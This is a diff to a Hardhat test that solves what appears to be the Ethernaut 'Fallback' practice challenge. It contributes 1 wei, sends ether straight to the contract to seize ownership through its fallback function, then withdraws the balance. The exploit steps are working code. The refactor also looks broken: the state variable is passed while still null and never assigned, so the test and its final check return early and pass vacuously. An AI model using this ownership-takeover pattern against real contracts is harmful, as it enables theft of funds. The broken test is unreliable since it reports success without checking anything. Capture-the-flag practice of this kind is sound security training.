@@ -3,38 +3,35 @@ import { Contract, Signer } from "ethers";
 import { ethers } from "hardhat";
 import { createChallenge, submitLevel } from "./utils";
 
-let accounts: Signer[];
-let eoa: Signer;
-let attacker: Contract;
-let challenge: Contract; // challenge contract
-let tx: any;
 
-before(async () => {
-  accounts = await ethers.getSigners();
-  [eoa] = accounts;
-  const challengeFactory = await ethers.getContractFactory(`Fallback`);
-  const challengeAddress = await createChallenge(
-    `0x9CB391dbcD447E645D6Cb55dE6ca23164130D008`
-  );
-  challenge = await challengeFactory.attach(challengeAddress);
-});
+let s: ChallengeState | null = null;
+
+before(getChallengeContract(s, `Fallback`, `0x9CB391dbcD447E645D6Cb55dE6ca23164130D008`));
 
 it("solves the challenge", async function () {
-  tx = await challenge.contribute({
+  let tx: any;
+  if (s == null) return;
+  console.log("my address: ", await s.eoa.getAddress());
+  console.log("original owner:", await s.challenge.owner());
+
+  tx = await s.challenge.contribute({
     value: ethers.utils.parseUnits(`1`, `wei`),
   });
   await tx.wait();
 
-  tx = await eoa.sendTransaction({
-    to: challenge.address,
+  tx = await s.eoa.sendTransaction({
+    to: s.challenge.address,
     value: ethers.utils.parseUnits(`1`, `wei`),
   });
   await tx.wait();
 
-  tx = await challenge.withdraw();
+  console.log("owner after sending ETH to contract: ", await s.challenge.owner());
+
+  tx = await s.challenge.withdraw();
   await tx.wait();
 });
 
 after(async () => {
-  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
+  if (s == null) return;
+  expect(await submitLevel(s.challenge.address), "level not solved").to.be.true;
 });
